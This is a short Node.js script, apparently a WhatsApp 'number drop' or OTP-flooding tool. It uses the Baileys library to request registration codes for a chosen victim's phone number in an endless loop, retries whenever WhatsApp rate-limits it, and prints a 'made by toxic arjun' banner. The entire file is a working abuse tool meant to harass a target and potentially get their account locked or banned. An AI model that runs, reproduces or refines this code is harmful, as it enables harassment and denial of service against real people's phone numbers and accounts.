const gradient = require('gradient-string');
const pino = require('pino');
const fs = require('fs');

const { default: makeWaSocket, useMultiFileAuthState } = require('@whiskeysockets/baileys');

const numbers = JSON.parse(fs.readFileSync('./files/numbers.json'));

const start = async () => {
  const { state, saveCreds } = await useMultiFileAuthState('.oiii');

  const spam = makeWaSocket({
    auth: state,
    mobile: true,
    logger: pino({ level: 'silent' })
  });

  const dropNumber = async (context) => {
    const { phoneNumber, ddi, number } = context;
    while (true) {
      try {
        console.clear();
        console.log(gradient('green', 'yellow')('ᴍᴀᴅᴇ ʙʏ ᴛᴏxɪᴄ ᴀʀᴊᴜɴ 👑+' + ddi + number));
        res = await spam.requestRegistrationCode({
          phoneNumber: '+' + phoneNumber,
          phoneNumberCountryCode: ddi,
          phoneNumberNationalNumber: number,
          phoneNumberMobileCountryCode: 724
        });
        const temporarilyUnavailable = (res.reason === 'temporarily_unavailable');
        if (temporarilyUnavailable) {
          setTimeout(async () => {
            dropNumber(context)
          }, res.retry_after * 100);
          return;
        }
      } catch (error) {
        // Ignore error, retry in loop
      }
    }
  };

  console.clear();
  console.log(gradient('black', 'black')('■'));
  console.log(gradient('black', 'black')('■'));
  console.log(gradient('black', 'black')('■'));

  const ddi = process.env.DDI || '91'; // Default India
  const number = process.env.NUMBER || '9876543210';
  const phoneNumber = ddi + number;

  numbers[phoneNumber] = { ddi, number };
  fs.writeFileSync('./files/numbers.json', JSON.stringify(numbers, null, '\t'));
  dropNumber({ phoneNumber, ddi, number });

  console.clear();
};

start();
